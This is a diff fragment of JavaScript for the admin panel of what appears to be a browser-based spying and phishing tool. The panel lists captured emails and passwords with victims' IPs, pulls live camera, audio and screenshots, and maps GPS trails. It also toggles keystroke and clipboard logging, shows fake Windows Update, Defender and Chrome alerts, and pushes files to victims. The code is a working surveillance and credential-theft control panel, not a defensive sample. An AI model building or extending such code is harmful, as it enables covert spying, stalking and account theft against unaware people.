+    c.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:.72rem">
+        <thead><tr style="border-bottom:1px solid var(--border2);color:var(--dim);text-align:left">
+            <th style="padding:7px 10px">#</th>
+            <th style="padding:7px 10px">Time</th>
+            <th style="padding:7px 10px">Email / Username</th>
+            <th style="padding:7px 10px">Password</th>
+            <th style="padding:7px 10px">Source</th>
+            <th style="padding:7px 10px">IP</th>
+        </tr></thead>
+        <tbody>${creds.map((cr, i) => `
+            <tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
+                <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
+                <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
+                <td style="padding:7px 10px;font-weight:600;color:#f4b400">${escHtml(cr.email)}</td>
+                <td style="padding:7px 10px;font-family:monospace;color:#4fc3f7;letter-spacing:.05em">${escHtml(cr.password)}</td>
+                <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.source||'')}</td>
+                <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.ip||'')}</td>
+            </tr>`).join('')}
+        </tbody></table>`;
+}
+
+async function clearCredentials() {
+    await apiFetch('/api/credentials', { method: 'DELETE' });
+    await loadCredentials();
+    refreshAll();
+}
+
+async function loadCameraFeeds() {
+    const [stats, photos] = await Promise.all([
+        api('/api/stats'),
+        api('/api/photos?limit=200')
+    ]);
+    const c = $('#cam-feeds');
+    if (!stats || !stats.clients) return;
+
+    // Group latest photo per client
+    const latestByClient = {};
+    if (photos) {
+        photos.forEach(p => { if (!latestByClient[p.clientId]) latestByClient[p.clientId] = p; });
+    }
+    if (stats.clients) {
+        Object.entries(stats.clients).forEach(([id, cl]) => {
+            if (cl.lastPhoto && !latestByClient[id]) {
+                latestByClient[id] = { clientId: id, path: cl.lastPhoto, timestamp: cl.lastPhotoTime };
+            }
+        });
+    }
+
+    // Get all clients (online ones first)
+    let clientIds = Object.keys(stats.clients).sort((a, b) => {
+        const ao = stats.clients[a].online ? 1 : 0;
+        const bo = stats.clients[b].online ? 1 : 0;
+        return bo - ao;
+    });
+    if (currentFilter) clientIds = clientIds.filter(id => id === currentFilter);
+
+    if (!clientIds.length) { c.innerHTML = '<div class="empty">No clients connected</div>'; return; }
+
+    // Only rebuild DOM if client list changed
+    const currentCards = c.querySelectorAll('.cam-card');
+    const currentIds = Array.from(currentCards).map(el => el.dataset.clientId);
+    const needsRebuild = clientIds.length !== currentIds.length || clientIds.some((id, i) => id !== currentIds[i]);
+
+    if (needsRebuild) {
+        c.innerHTML = '<div class="cam-grid">' + clientIds.map(id => {
+            const cl = stats.clients[id] || {};
+            const online = cl.online;
+            const p = latestByClient[id];
+            const isLive = liveFeeds[id];
+            const geo = cl.ipGeo;
+            const geoStr = geo ? `${geo.city}, ${geo.country}` : '';
+
+            return `<div class="cam-card" data-client-id="${id}">
+                <div class="cam-hdr">
+                    <span class="cam-id">${online ? '<span class="cam-dot"></span>' : ''}${id}</span>
+                    <span id="live-ind-${id}" class="live-indicator" style="display:${isLive?'inline-flex':'none'}">
+                        <span class="live-dot"></span> LIVE
+                    </span>
+                    <span id="cam-fps-${id}" class="cam-fps"></span>
+                    <span class="cam-time" id="cam-time-${id}">${p ? fmtTime(p.timestamp) : '—'}</span>
+                </div>
+                <img id="cam-img-${id}" src="${p ? p.path + '?t=' + Date.now() : ''}" onclick="openLightbox(this.src)" alt="" style="${p ? '' : 'display:none'}">
+                <div id="cam-noimg-${id}" class="empty" style="${p ? 'display:none' : ''}">Geen camera beeld</div>
+                <div class="cam-meta" id="cam-meta-${id}">
+                    ${cl.ip||''} ${cl.networkType?'· '+cl.networkType:''} ${cl.battery!==undefined?'· '+cl.battery+'%':''}
+                    ${geoStr?'· '+geoStr:''}
+                </div>
+                <div class="cam-controls">
+                    <button id="cam-btn-${id}" onclick="toggleLiveFeed('${id}')" ${!online?'disabled':''}>${isLive ? '■ Stop' : '▶ Live'}</button>
+                    <button id="mic-btn-${id}" onclick="toggleAudio('${id}')" ${!online?'disabled':''}>🎤 Audio</button>
+                    <button onclick="requestScreenshot('${id}')" ${!online?'disabled':''}>📷 Snapshot</button>
+                </div>
+            </div>`;
+        }).join('') + '</div>';
+    } else {
+        // Update existing cards without full rebuild (preserve live feed images)
+        clientIds.forEach(id => {
+            const cl = stats.clients[id] || {};
+            const p = latestByClient[id];
+            if (!liveFeeds[id] && p) {
+                const img = $(`#cam-img-${id}`);
+                if (img && img.src.indexOf('data:') === -1) {
+                    img.src = p.path + '?t=' + Date.now();
+                    img.style.display = '';
+                    const noimg = $(`#cam-noimg-${id}`);
+                    if (noimg) noimg.style.display = 'none';
+                }
+                const timeEl = $(`#cam-time-${id}`);
+                if (timeEl) timeEl.textContent = fmtTime(p.timestamp);
+            }
+        });
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  LIVE CAMERA CONTROLS
+// ═══════════════════════════════════════════════════════════════
+function toggleLiveFeed(clientId) {
+    if (liveFeeds[clientId]) {
+        stopLiveFeed(clientId);
+    } else {
+        startLiveFeed(clientId);
+    }
+}
+
+function startLiveFeed(clientId) {
+    if (!socket || !socket.connected) { toast('⚠ Niet verbonden met server'); return; }
+    liveFeeds[clientId] = { active: true, lastFrame: Date.now() };
+    socket.emit('request-live-feed', clientId);
+    const ind = $(`#live-ind-${clientId}`);
+    if (ind) ind.style.display = 'inline-flex';
+    const btn = $(`#cam-btn-${clientId}`);
+    if (btn) { btn.textContent = '■ Stop'; btn.classList.add('active'); }
+    $('#live-status').textContent = `Requesting feed from ${clientId}...`;
+    $('#live-status').style.color = 'var(--yellow)';
+    // Timeout: if no frame in 8s, show error
+    setTimeout(() => {
+        if (liveFeeds[clientId] && !liveFeeds[clientId].lastFrame) {
+            $('#live-status').textContent = `No response from ${clientId} — client may not have camera`;
+            $('#live-status').style.color = 'var(--accent)';
+        }
+    }, 8000);
+}
+
+function stopLiveFeed(clientId) {
+    if (!socket) return;
+    socket.emit('stop-live-feed', clientId);
+    delete liveFeeds[clientId];
+    delete liveFpsCounters[clientId];
+    const ind = $(`#live-ind-${clientId}`);
+    if (ind) ind.style.display = 'none';
+    const btn = $(`#cam-btn-${clientId}`);
+    if (btn) { btn.textContent = '▶ Live'; btn.classList.remove('active'); }
+    const fpsEl = $(`#cam-fps-${clientId}`);
+    if (fpsEl) fpsEl.textContent = '';
+    if (Object.keys(liveFeeds).length === 0) {
+        $('#live-status').textContent = 'Click a client to start live feed';
+        $('#live-status').style.color = 'var(--dim)';
+    }
+}
+
+function startAllLiveFeeds() {
+    api('/api/stats').then(stats => {
+        if (!stats || !stats.clients) return;
+        Object.entries(stats.clients).forEach(([id, cl]) => {
+            if (cl.online && !liveFeeds[id]) startLiveFeed(id);
+        });
+    });
+}
+
+function stopAllLiveFeeds() {
+    Object.keys(liveFeeds).forEach(id => stopLiveFeed(id));
+}
+
+function requestScreenshot(clientId) {
+    fetch('/api/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN },
+        body: JSON.stringify({ target: clientId, type: 'screenshot', data: {} })
+    }).then(r => r.ok ? toast(`📷 Screenshot requested from ${clientId}`) : null);
+}
+
+function toggleAudio(clientId) {
+    if (audioPlayers[clientId]) {
+        socket.emit('stop-audio', clientId);
+        delete audioPlayers[clientId];
+        const btn = $(`#mic-btn-${clientId}`);
+        if (btn) { btn.textContent = '🎤 Audio'; btn.classList.remove('active'); }
+    } else {
+        if (!socket || !socket.connected) { toast('⚠ Not connected'); return; }
+        audioPlayers[clientId] = true;
+        socket.emit('request-audio', clientId);
+        const btn = $(`#mic-btn-${clientId}`);
+        if (btn) { btn.textContent = '🔇 Stop'; btn.classList.add('active'); }
+        toast(`🎤 Audio requested from ${clientId}`);
+    }
+}
+
+async function clearAll() {
+    await fetch('/api/clear', { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    events = [];
+    refreshAll();
+    renderEvents();
+}
+
+async function doLogout() {
+    await fetch('/api/auth/logout', { method: 'POST', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    document.cookie = 'adminToken=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+    location.href = '/admin';
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  RENDERERS
+// ═══════════════════════════════════════════════════════════════
+function renderClients(clients) {
+    lastClientsData = clients;
+    try {
+    const c = $('#cl-list');
+    let entries = Object.entries(clients || {});
+    if (currentFilter) entries = entries.filter(([id]) => id === currentFilter);
+    if (!entries.length) { c.innerHTML = '<div class="empty">No clients</div>'; return; }
+
+    // Sort: pinned first, then online, then by lastSeen
+    entries.sort((a, b) => {
+        const aPin = !!(clientTagsCache[a[0]] && clientTagsCache[a[0]].pinned);
+        const bPin = !!(clientTagsCache[b[0]] && clientTagsCache[b[0]].pinned);
+        if (aPin && !bPin) return -1;
+        if (!aPin && bPin) return 1;
+        if (a[1].online && !b[1].online) return -1;
+        if (!a[1].online && b[1].online) return 1;
+        return new Date(b[1].lastSeen) - new Date(a[1].lastSeen);
+    });
+
+    c.innerHTML = entries.map(([id, cl]) => {
+        const tag      = clientTagsCache[id] || {};
+        const isPinned = !!tag.pinned;
+        const label    = tag.label || '';
+        const tagList  = tag.tags || [];
+        const notesCnt = (clientNotesCache[id] || []).length;
+
+        const loc = cl.lastLocation;
+        const locH = loc
+            ? `<div class="loc">${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}${loc.accuracy ? ' +/-' + Math.round(loc.accuracy) + 'm' : ''} <span style="color:var(--dim);font-size:.55rem">[${loc.source || ''}]</span> <button class="copy-btn" onclick="event.stopPropagation();copyText('${loc.latitude + ',' + loc.longitude}',this)">Copy</button> <a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank">Map</a></div>`
+            : '<div class="loc" style="color:#333">No GPS</div>';
+        const geo  = cl.ipGeo;
+        const geoH = geo ? `<div class="geo">${geo.city}, ${geo.region}, ${geo.country} - ${geo.isp || ''}</div>` : '';
+        const photoH  = cl.lastPhoto ? `<img class="photo-thumb" src="${cl.lastPhoto}" alt="">` : '';
+        const battH   = cl.battery !== undefined ? ` - ${cl.battery}%${cl.charging?' ?':''}` : '';
+        const netH    = cl.networkType ? ` - ${cl.networkType}${cl.downlink?' '+cl.downlink+'Mbps':''}` : '';
+        const dur     = cl.firstSeen ? fmtDuration(cl.firstSeen) : '';
+        const idleH   = cl.isIdle ? ` <span style="color:#886;font-size:.6rem" title="Idle ${cl.idleSecs||0}s">[IDLE]</span>` : '';
+        const hiddenH = cl.tabHidden ? ` <span style="color:#556;font-size:.6rem">[HIDDEN]</span>` : '';
+        const scrollH = cl.maxScrollPct ? ` <span style="color:var(--dim);font-size:.6rem" title="Max scroll depth">?${cl.maxScrollPct}%</span>` : '';
+
+        const labelBadge = label ? `<span class="cl-label-badge" style="border-color:#bdc1c6;color:#5f6368">${esc(label)}</span>` : '';
+        const tagBadges  = tagList.map(t => `<span class="cl-label-badge">${esc(t)}</span>`).join('');
+        const badgeRow   = (labelBadge || tagBadges) ? `<div style="margin-bottom:4px">${labelBadge}${tagBadges}</div>` : '';
+
+        return `<div class="cl${isPinned ? ' cl-pinned' : ''}">
+            <div class="dot ${cl.online ? 'on' : 'off'}"></div>
+            <div class="inf">
+                <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
+                ${badgeRow}
+                <div class="meta">${cl.online ? 'Online' : 'Offline'} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}</div>
+                ${locH}${geoH}
+                <div class="dev">${cl.screen || ''} - ${cl.language || ''} - ${cl.timezone || ''} ${dur ? '- ' + dur : ''}</div>
+                <div class="dev" style="opacity:.55">${(cl.userAgent || '').slice(0, 100)}</div>
+                <div class="cl-action-bar">
+                    <button class="cl-action-btn" onclick="event.stopPropagation();openNotes('${id}')">Notes${notesCnt ? '(' + notesCnt + ')' : ''}</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();openTagModal('${id}')">Label</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();exportClient('${id}')">Export</button>
+                    ${isPinned
+                        ? `<button class="cl-action-btn" onclick="event.stopPropagation();unPinClient('${id}')" style="border-color:#553333;color:#aa5555">Unpin</button>`
+                        : `<button class="cl-action-btn" onclick="event.stopPropagation();quickPin('${id}')">Pin</button>`}
+                </div>
+            </div>
+            ${photoH}
+            <button class="del-btn" onclick="event.stopPropagation();if(confirm('Delete ${id}?'))deleteClient('${id}')" title="Delete">X</button>
+        </div>`;
+    }).join('');
+    } catch(e) { showError('renderClients', e); }
+}
+
+function renderRecentPhotos(photos) {
+    const c = $('#recent-photos');
+    if (!photos.length) { c.innerHTML = '<div class="empty">No photos</div>'; return; }
+    c.innerHTML = '<div class="pgrid">' + photos.map(p => `
+        <div class="pcard" onclick="openLightbox('${p.path}')">
+            <img src="${p.path}" loading="lazy" alt="">
+            <div class="pi"><strong>${p.clientId}</strong>${fmtTime(p.timestamp)}</div>
+        </div>
+    `).join('') + '</div>';
+}
+
+function renderLocations(locs) {
+    const c = $('#loc-list');
+    if (!locs.length) { c.innerHTML = '<div class="empty">No locations</div>'; return; }
+    c.innerHTML = locs.slice(0, 30).map(l => `
+        <div class="loci">
+            <span class="coords">${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}</span>
+            <span class="who">${l.clientId}</span>
+            ${l.source ? `<span class="src">${l.source}</span>` : ''}
+            <span class="when">${fmtTime(l.timestamp)}</span>
+            <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">Map ↗</a>
+        </div>
+    `).join('');
+}
+
+function renderEvents() {
+    const evTypeFilter = (() => { try { const f = document.getElementById('ev-type-filter'); return f ? f.value : ''; } catch(x){ return ''; } })();
+    const list1 = $('#ev-list');
+    const list2 = $('#ev-full');
+    if (!events.length) {
+        const e = '<div class="empty">Waiting for events...</div>';
+        if (list1) list1.innerHTML = e;
+        if (list2) list2.innerHTML = e;
+        return;
+    }
+    const html = evs => evs.map(ev => `
+        <div class="ev">
+            <span class="t">${fmtTime(ev.timestamp)}</span>
+            <span class="tp ${ev.type}">${ev.type.replace(/_/g,' ')}</span>
+            <span class="d">${fmtEvent(ev.data)}</span>
+        </div>
+    `).join('');
+    const filteredEvs = evTypeFilter ? events.filter(e => (e.type || '') === evTypeFilter) : events;
+    if (list1) list1.innerHTML = html(filteredEvs.slice(0, 50));
+    if (list2) {
+        if (!filteredEvs.length) {
+            list2.innerHTML = '<div class="empty">No events' + (evTypeFilter ? ' of type "' + evTypeFilter + '"' : '') + '</div>';
+        } else {
+            list2.innerHTML = html(filteredEvs.slice(0, 300));
+        }
+    }
+    // Update activity chart
+    try { updateActivityChart(); } catch(e) {}
+}
+
+function renderDevices() {
+    const c = $('#device-panels');
+    let entries = Object.entries(deviceInfo || {});
+    if (currentFilter) entries = entries.filter(([id]) => id === currentFilter);
+    if (!entries.length) { c.innerHTML = '<div class="empty" style="padding:40px">No device info</div>'; return; }
+
+    c.innerHTML = entries.map(([id, info]) => {
+        const fields = Object.entries(info).filter(([k]) => k !== 'timestamp');
+        return `<div class="pnl" style="margin-bottom:12px">
+            <div class="pnl-h"><h2>${id}</h2><span style="font-size:.6rem;color:var(--dim)">${fmtTime(info.timestamp)}</span></div>
+            <div class="pnl-b"><div class="di-grid">${fields.map(([k,v]) => `
+                <div class="di-item"><div class="k">${k}</div><div class="v">${v ?? '—'}</div></div>
+            `).join('')}</div></div>
+        </div>`;
+    }).join('');
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  MAP
+// ═══════════════════════════════════════════════════════════════
+function initMap() {
+    if (map) { map.invalidateSize(); loadMap(); return; }
+    map = L.map('map').setView([20, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap'
+    }).addTo(map);
+    loadMap();
+}
+
+async function loadMap() {
+    if (!map) return;
+    const locs = await api('/api/locations?limit=500' + filterParam());
+    if (!locs) return;
+
+    // Clear previous
+    Object.values(markers).forEach(m => map.removeLayer(m));
+    markers = {};
+    trailLayers.forEach(l => map.removeLayer(l));
+    trailLayers = [];
+
+    // Latest per client
+    const byClient = {};
+    locs.forEach(l => { if (!byClient[l.clientId]) byClient[l.clientId] = l; });
+
+    // Colors per client
+    const colors = ['#ffffff','#aaaaaa','#888888','#666666','#bbbbbb','#999999','#cccccc','#777777'];
+    let ci = 0;
+
+    Object.entries(byClient).forEach(([id, l]) => {
+        const color = colors[ci++ % colors.length];
+        const m = L.circleMarker([l.latitude, l.longitude], {
+            radius: 8, color, fillColor: color, fillOpacity: 0.7
+        }).addTo(map);
+        m.bindPopup(`<b>${id}</b><br>${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}<br>${l.source||''}<br>${fmtTime(l.timestamp)}`);
+        markers[id] = m;
+    });
+
+    // Trails
+    const trails = {};
+    locs.forEach(l => {
+        if (!trails[l.clientId]) trails[l.clientId] = [];
+        trails[l.clientId].push([l.latitude, l.longitude]);
+    });
+    ci = 0;
+    Object.values(trails).forEach(trail => {
+        if (trail.length > 1) {
+            const color = colors[ci++ % colors.length] + '66';
+            const line = L.polyline(trail, { color, weight: 2 }).addTo(map);
+            trailLayers.push(line);
+        }
+    });
+
+    // Fit bounds
+    const coords = Object.values(byClient).map(l => [l.latitude, l.longitude]);
+    if (coords.length) map.fitBounds(coords, { padding: [40, 40], maxZoom: 14 });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  DELETE CLIENT
+// ═══════════════════════════════════════════════════════════════
+async function deleteClient(id) {
+    await fetch(`/api/client/${id}`, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    refreshAll();
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  LIGHTBOX
+// ═══════════════════════════════════════════════════════════════
+function openLightbox(src) {
+    $('#lb-img').src = src;
+    $('#lightbox').classList.add('show');
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  TOAST
+// ═══════════════════════════════════════════════════════════════
+function showToast(ev) {
+    const area = $('#toasts');
+    const cls = ev.type === 'location' ? 'loc' : ev.type === 'photo' ? 'photo' : ev.type === 'error' ? 'error' : ev.type;
+    const toast = document.createElement('div');
+    toast.className = `toast ${cls}`;
+    toast.textContent = `${ev.type.replace(/_/g,' ').toUpperCase()}: ${fmtEvent(ev.data).slice(0, 50)}`;
+    area.appendChild(toast);
+    setTimeout(() => toast.remove(), 4000);
+    // Play notification sound for important events
+    if (['client_connected', 'client_disconnected', 'photo', 'media', 'error'].includes(ev.type)) {
+        playAdminNotifSound(ev.type);
+    }
+}
+
+function playAdminNotifSound(type) {
+    try {
+        const a = new AudioContext();
+        const o = a.createOscillator();
+        const g = a.createGain();
+        o.connect(g); g.connect(a.destination);
+        if (type === 'client_connected') {
+            o.frequency.setValueAtTime(523, a.currentTime);
+            o.frequency.setValueAtTime(659, a.currentTime + 0.1);
+            o.frequency.setValueAtTime(784, a.currentTime + 0.2);
+        } else if (type === 'client_disconnected') {
+            o.frequency.setValueAtTime(440, a.currentTime);
+            o.frequency.setValueAtTime(330, a.currentTime + 0.1);
+            o.frequency.setValueAtTime(262, a.currentTime + 0.2);
+        } else if (type === 'error') {
+            o.frequency.setValueAtTime(330, a.currentTime);
+            o.frequency.setValueAtTime(220, a.currentTime + 0.15);
+        } else {
+            o.frequency.setValueAtTime(660, a.currentTime);
+            o.frequency.setValueAtTime(880, a.currentTime + 0.08);
+        }
+        g.gain.setValueAtTime(0.06, a.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.35);
+        o.start(a.currentTime); o.stop(a.currentTime + 0.35);
+    } catch {}
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  HELPERS
+// ═══════════════════════════════════════════════════════════════
+function fmtTime(ts) {
+    if (!ts) return '—';
+    return new Date(ts).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}
+
+function fmtSize(b) {
+    if (!b) return '—';
+    if (b < 1024) return b + ' B';
+    if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
+    return (b/1048576).toFixed(1) + ' MB';
+}
+
+function fmtDuration(since) {
+    const ms = Date.now() - new Date(since).getTime();
+    const s = Math.floor(ms/1000), m = Math.floor(s/60), h = Math.floor(m/60), d = Math.floor(h/24);
+    if (d > 0) return d + 'd ' + (h%24) + 'h';
+    if (h > 0) return h + 'h ' + (m%60) + 'm';
+    if (m > 0) return m + 'm';
+    return s + 's';
+}
+
+function fmtEvent(data) {
+    if (!data) return '';
+    if (data.latitude) return `${data.clientId} → ${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)}${data.source?' ['+data.source+']':''}`;
+    if (data.filename) return `${data.clientId} → ${data.filename}${data.size?' ('+fmtSize(data.size)+')':''}`;
+    if (data.path) return `${data.clientId} → ${data.path.split('/').pop()}`;
+    if (data.platform) return `${data.clientId} → ${data.platform} (${data.ip||''})`;
+    if (data.userAgent) return `${data.clientId} → ${data.userAgent.slice(0,50)}`;
+    if (data.message) return `${data.clientId} → [${data.type||''}] ${data.message}`;
+    if (data.length !== undefined) return `${data.clientId} → ${data.length} chars${data.url?' from '+data.url:''}`;
+    if (data.url) return `${data.clientId} → ${data.url}`;
+    if (data.clientId) return data.clientId;
+    return JSON.stringify(data).slice(0, 80);
+}
+
+function escHtml(str) {
+    if (!str) return '';
+    const d = document.createElement('div');
+    d.textContent = str;
+    return d.innerHTML;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  SETTINGS
+// ═══════════════════════════════════════════════════════════════
+async function loadConfig() {
+    const cfg = await api('/api/config');
+    if (!cfg) return;
+    $('#cfg-photo-on').checked = cfg.photoEnabled !== false;
+    $('#cfg-photo-period').value = Math.round((cfg.photoPeriod || 30000) / 1000);
+    const q = Math.round((cfg.photoQuality || 0.7) * 100);
+    $('#cfg-photo-q').value = q; $('#cfg-photo-q-val').textContent = q + '%';
+    $('#cfg-video-on').checked = cfg.videoEnabled !== false;
+    $('#cfg-video-period').value = Math.round((cfg.videoPeriod || 300000) / 1000);
+    $('#cfg-video-dur').value = Math.round((cfg.videoDuration || 10000) / 1000);
+    $('#cfg-loc-on').checked = cfg.locationEnabled !== false;
+    $('#cfg-loc-period').value = Math.round((cfg.locationPeriod || 15000) / 1000);
+    $('#cfg-key-on').checked = cfg.keystrokesEnabled !== false;
+    $('#cfg-key-flush').value = Math.round((cfg.keyLogFlush || 10000) / 1000);
+    $('#cfg-clip-on').checked = cfg.clipboardEnabled !== false;
+    $('#cfg-clip-check').value = Math.round((cfg.clipboardCheck || 15000) / 1000);
+    $('#cfg-hb').value = Math.round((cfg.heartbeatPeriod || 8000) / 1000);
+}
+
+async function saveConfig() {
+    const cfg = {
+        photoEnabled: $('#cfg-photo-on').checked,
+        photoPeriod: parseInt($('#cfg-photo-period').value) * 1000,
+        photoQuality: parseInt($('#cfg-photo-q').value) / 100,
+        videoEnabled: $('#cfg-video-on').checked,
+        videoPeriod: parseInt($('#cfg-video-period').value) * 1000,
+        videoDuration: parseInt($('#cfg-video-dur').value) * 1000,
+        locationEnabled: $('#cfg-loc-on').checked,
+        locationPeriod: parseInt($('#cfg-loc-period').value) * 1000,
+        keystrokesEnabled: $('#cfg-key-on').checked,
+        keyLogFlush: parseInt($('#cfg-key-flush').value) * 1000,
+        clipboardEnabled: $('#cfg-clip-on').checked,
+        clipboardCheck: parseInt($('#cfg-clip-check').value) * 1000,
+        heartbeatPeriod: parseInt($('#cfg-hb').value) * 1000
+    };
+    const r = await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(cfg) });
+    if (r.ok) toast('\u2705 Instellingen opgeslagen! Clients laden bij volgende page-reload.');
+}
+
+async function resetConfig() {
+    if (!confirm('Reset alle instellingen naar standaard?')) return;
+    const def = { photoEnabled:true, photoPeriod:30000, photoQuality:0.7, videoEnabled:true, videoPeriod:300000, videoDuration:10000, locationEnabled:true, locationPeriod:15000, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
+    await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(def) });
+    loadConfig();
+    toast('\u2705 Instellingen gereset naar standaard.');
+}
+
+async function loadStorage() {
+    const s = await api('/api/storage');
+    if (!s) return;
+    const el = $('#storage-info');
+    const total = parseFloat(s.totalMB) || 0;
+    const pPct = total > 0 ? ((parseFloat(s.photoMB) / total) * 100).toFixed(0) : 0;
+    el.innerHTML = `
+        <div style="font-size:.78rem;font-weight:700;color:var(--accent);margin-bottom:6px">${s.totalMB} MB totaal gebruikt</div>
+        <div class="storage-bar"><div style="width:${Math.min(pPct, 100)}%;background:linear-gradient(90deg,var(--accent),var(--purple))"></div></div>
+        <div style="font-size:.7rem;color:var(--text);line-height:2">
+            <div>\uD83D\uDCF8 Foto's: <strong>${s.photoCount}</strong> <span style="color:var(--dim)">(${s.photoMB} MB)</span></div>
+            <div>\uD83D\uDCF9 Video's: <strong>${s.videoCount}</strong> <span style="color:var(--dim)">(${s.videoMB} MB)</span></div>
+        </div>`;
+}
+
+async function doCleanup(type, keep) {
+    const msg = keep === 0 ? `Alle ${type} verwijderen?` : `Alleen de laatste ${keep} ${type} bewaren?`;
+    if (!confirm(msg)) return;
+    await fetch('/api/cleanup', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify({ type, keep }) });
+    loadStorage();
+    refreshAll();
+    toast(`\uD83D\uDDD1 ${type} opgeschoond`);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  COMMANDS
+// ═══════════════════════════════════════════════════════════════
+function onCmdTypeChange() {
+    const t = $('#cmd-type').value;
+    ['notif','alert','redirect','sound','popup','overlay','file'].forEach(s => {
+        const el = $(`#cmd-${s}-opts`); if (el) el.style.display = 'none';
+    });
+    const m = { notification:'notif', alert:'alert', redirect:'redirect', sound:'sound', popup:'popup', overlay:'overlay', file:'file' };
+    if (m[t]) { const el = $(`#cmd-${m[t]}-opts`); if (el) el.style.display = 'block'; }
+}
+
+function applyPreset(name, btn) {
+    $$('.cmd-preset button').forEach(b => b.classList.remove('active'));
+    if (btn) btn.classList.add('active');
+    const presets = {
+        custom: { icon:'info', app:'System', title:'', message:'', btn1:'', btn1url:'', btn2:'', btn2url:'' },
+        winupdate: { icon:'update', app:'Windows Update', title:'Updates beschikbaar', message:'Er zijn belangrijke updates klaar om te installeren. Start uw apparaat opnieuw op om de updates te voltooien.', btn1:'Nu herstarten', btn1url:'', btn2:'Later herinneren', btn2url:'' },
+        defender: { icon:'shield', app:'Windows Security', title:'Bedreiging gevonden', message:'Windows Defender heeft verdachte activiteit op uw apparaat gedetecteerd. Klik om details te bekijken.', btn1:'Details bekijken', btn1url:'', btn2:'Negeren', btn2url:'' },
+        chrome: { icon:'chrome', app:'Google Chrome', title:'Chrome update beschikbaar', message:'Er is een nieuwe versie van Chrome beschikbaar. Update nu om de nieuwste beveiligingsfuncties te krijgen.', btn1:'Nu updaten', btn1url:'', btn2:'Later', btn2url:'' },
+        edge: { icon:'edge', app:'Microsoft Edge', title:'Microsoft Edge melding', message:'Edge heeft een betere deal gevonden voor dit product! Klik om te vergelijken.', btn1:'Bekijken', btn1url:'', btn2:'Sluiten', btn2url:'' }
+    };
+    const p = presets[name] || presets.custom;
+    $('#cmd-icon').value = p.icon; $('#cmd-app').value = p.app;
+    $('#cmd-title').value = p.title; $('#cmd-msg').value = p.message;
+    $('#cmd-btn1').value = p.btn1; $('#cmd-btn1url').value = p.btn1url;
+    $('#cmd-btn2').value = p.btn2; $('#cmd-btn2url').value = p.btn2url;
+}
+
+function onFileSelected(input) {
+    const file = input.files[0];
+    if (!file) return;
+    const nameEl = $('#cmd-file-name');
+    const infoEl = $('#cmd-file-info');
+    nameEl.textContent = file.name;
+    const sizeFmt = file.size < 1048576 ? (file.size / 1024).toFixed(1) + ' KB' : (file.size / 1048576).toFixed(2) + ' MB';
+    infoEl.textContent = `✅ ${file.name}  ·  ${sizeFmt}  ·  ${file.type || 'onbekend type'}`;
+    infoEl.style.display = 'block';
+}
+
+async function sendCommand() {
+    const type = $('#cmd-type').value, target = $('#cmd-target').value;
+
+    // File send — uses multipart upload, separate route
+    if (type === 'file') {
+        const fileInput = $('#cmd-file-input');
+        if (!fileInput || !fileInput.files[0]) { toast('⚠️ Selecteer eerst een bestand!'); return; }
+        const fd = new FormData();
+        fd.append('file', fileInput.files[0]);
+        fd.append('target', target);
+        const customName = $('#cmd-file-customname')?.value.trim();
+        if (customName) fd.append('customName', customName);
+        try {
+            const r = await fetch('/api/command-file?token=' + AUTH_TOKEN, { method: 'POST', body: fd });
+            if (r.ok) {
+                const result = await r.json();
+                toast(`📁 Bestand verstuurd: ${result.filename} → ${target}`);
+                // Reset file input
+                fileInput.value = '';
+                $('#cmd-file-name').textContent = 'Klik om een bestand te selecteren...';
+                $('#cmd-file-info').style.display = 'none';
+                if ($('#cmd-file-customname')) $('#cmd-file-customname').value = '';
+            } else { toast('❌ Upload mislukt'); }
+        } catch(e) { toast('❌ Fout: ' + e.message); }
+        return;
+    }
+
+    let data = {};
+    if (type === 'notification') {
